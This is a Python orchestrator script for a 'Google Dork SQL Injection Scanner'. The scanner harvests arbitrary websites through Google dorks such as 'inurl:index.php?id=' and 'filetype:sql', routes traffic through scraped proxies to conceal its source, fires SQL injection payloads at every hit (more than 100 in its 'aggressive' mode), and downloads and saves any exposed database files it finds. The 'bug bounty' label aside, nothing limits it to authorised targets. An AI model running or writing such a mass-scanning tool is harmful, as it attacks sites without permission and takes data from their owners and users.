#!/usr/bin/env python3
"""
Google Dork SQL Injection Scanner
Main orchestrator script - Central access point
"""

import os
import sys
import argparse
from colorama import init, Fore, Style
from network_module import ProxyManager, GoogleSearcher
from scanner_module import SQLChecker, DatabaseDownloader
from utils_module import DataOrganizer, print_banner, print_section_header, print_status, print_stats
from payload_module import SQLIPayloads

init(autoreset=True)

def load_dorks(dorks_file: str) -> list:
    """Load Google dorks from file"""
    if not os.path.exists(dorks_file):
        print(f"{Fore.RED}[!] Dorks file not found: {dorks_file}")
        print(f"{Fore.YELLOW}[*] Creating sample dorks.txt file...")
        create_sample_dorks(dorks_file)
        return []
    
    with open(dorks_file, 'r', encoding='utf-8') as f:
        dorks = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    return dorks

def create_sample_dorks(filename: str):
    """Create a sample dorks file"""
    sample_dorks = [
        "inurl:index.php?id=",
        "inurl:page.php?id=",
        "inurl:product.php?id=",
        "inurl:category.php?id=",
        "inurl:view.php?id=",
        "filetype:sql",
        "filetype:db",
        "intitle:index.of database",
    ]
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("# Google Dorks for SQL Injection and Database Discovery\n")
        f.write("# Add your dorks here, one per line\n\n")
        for dork in sample_dorks:
            f.write(f"{dork}\n")
    
    print(f"{Fore.GREEN}[+] Created sample dorks file: {filename}")

def main():
    parser = argparse.ArgumentParser(
        description='Google Dork SQL Injection Scanner for Bug Bounties',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --dorks dorks.txt
  python main.py --dorks dorks.txt --max-proxies 100 --aggressive
  python main.py --dorks dorks.txt --user-proxies proxies.txt
        """
    )
    
    parser.add_argument('--dorks', '-d', default='dorks.txt',
                       help='Path to dorks file (default: dorks.txt)')
    parser.add_argument('--max-proxies', '-p', type=int, default=50,
                       help='Maximum number of proxies to scrape (default: 50)')
    parser.add_argument('--user-proxies', '-u', default=None,
                       help='Path to user proxies file (format: ip:port)')
    parser.add_argument('--no-proxy', action='store_true',
                       help='Run without proxies (not recommended)')
    parser.add_argument('--output', '-o', default='results.txt',
                       help='Output file for results (default: results.txt)')
    parser.add_argument('--aggressive', '-a', action='store_true',
                       help='Use aggressive SQL injection testing with all payloads')
    parser.add_argument('--max-urls', type=int, default=None,
                       help='Maximum number of URLs to test (default: unlimited)')
    parser.add_argument('--threads', '-t', type=int, default=10,
                       help='Number of threads for concurrent operations (default: 10)')
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Load dorks
    print_section_header("📋 LOADING GOOGLE DORKS")
    print_status(f"Loading dorks from: {args.dorks}", "info")
    dorks = load_dorks(args.dorks)
    
    if not dorks:
        print_status(f"No dorks loaded. Please add dorks to {args.dorks}", "error")
        return
    
    print_status(f"Loaded {len(dorks)} dorks successfully", "success")
    
    # Initialize proxy manager
    proxy_manager = None
    if not args.no_proxy:
        print_section_header("🔄 PROXY MANAGEMENT")
        proxy_manager = ProxyManager(max_proxies=args.max_proxies)
        
        # Load user proxies if provided
        if args.user_proxies:
            print_status(f"Loading user proxies from: {args.user_proxies}", "info")
            proxy_manager.load_user_proxies(args.user_proxies)
        
        # Scrape and validate proxies
        print_status("Aggressively scraping proxies from multiple sources...", "info")
        proxy_manager.scrape_all_sources()
        
        if proxy_manager.has_proxies():
            print_status(f"Successfully loaded {proxy_manager.get_proxy_count()} proxies", "success")
        else:
            print_status("No valid proxies found. Continuing without proxy...", "warning")
    
    # Search Google with dorks
    print_section_header("🔎 GOOGLE SEARCH AUTOMATION")
    print_status(f"Searching Google with {len(dorks)} dork queries...", "info")
    searcher = GoogleSearcher(proxy_manager, threads=args.threads)
    search_results = searcher.search_multiple_dorks(dorks)
    
    if not search_results:
        print_status("No search results found", "error")
        return
    
    print_status(f"Found {len(search_results)} total search results", "success")
    
    # Extract URLs
    urls = [result['url'] for result in search_results]
    unique_urls = list(set(urls))
    print_status(f"Found {len(unique_urls)} unique URLs", "success")
    
    # Limit URLs if specified
    if args.max_urls:
        unique_urls = unique_urls[:args.max_urls]
        print_status(f"Limited to {len(unique_urls)} URLs for testing", "info")
    
    # Check for SQL injection vulnerabilities
    print_section_header("💉 SQL INJECTION VULNERABILITY DETECTION")
    if args.aggressive:
        print_status("🔥 AGGRESSIVE MODE: Using comprehensive payload library (100+ payloads)", "vuln")
    else:
        print_status("Using standard payload testing", "info")
    
    checker = SQLChecker(proxy_manager, aggressive=args.aggressive, threads=args.threads)
    vulnerable_urls = checker.check_urls(unique_urls)
    
    if vulnerable_urls:
        print_status(f"Found {len(vulnerable_urls)} potentially vulnerable URLs", "vuln")
    else:
        print_status("No SQL injection vulnerabilities detected", "info")
    
    # Download and parse database files
    print_section_header("💾 DATABASE FILE EXTRACTION")
    print_status("Checking for database files in search results...", "info")
    downloader = DatabaseDownloader(proxy_manager)
    urls_to_check = unique_urls if not args.max_urls else unique_urls[:args.max_urls]
    database_data = downloader.extract_data_from_urls(urls_to_check)
    
    if database_data:
        print_status(f"Extracted data from {len(database_data)} database items", "success")
    else:
        print_status("No database files found", "info")
    
    # Organize and save results
    print_section_header("📊 ORGANIZING RESULTS")
    organizer = DataOrganizer(args.output)
    organizer.organize_vulnerable_urls(vulnerable_urls)
    organizer.organize_database_files(downloader.downloaded_files)
    organizer.write_to_file()
    organizer.write_json(args.output.replace('.txt', '.json'))
    
    # Print statistics
    stats = {
        "Total Dorks": len(dorks),
        "Search Results": len(search_results),
        "Unique URLs": len(unique_urls),
        "Vulnerable URLs": len(vulnerable_urls),
        "Database Files": len(downloader.downloaded_files),
        "Proxies Used": proxy_manager.get_proxy_count() if proxy_manager else 0
    }
    print_stats(stats)
    
    print(f"\n{Fore.GREEN}✅ Scan complete! Results saved to {args.output}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}\n⚠️  Scan interrupted by user{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Partial results may be available in output files.{Style.RESET_ALL}\n")
        sys.exit(0)
    except ImportError as e:
        print(f"\n{Fore.RED}❌ Import Error: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Please install dependencies: pip install -r requirements.txt{Style.RESET_ALL}\n")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
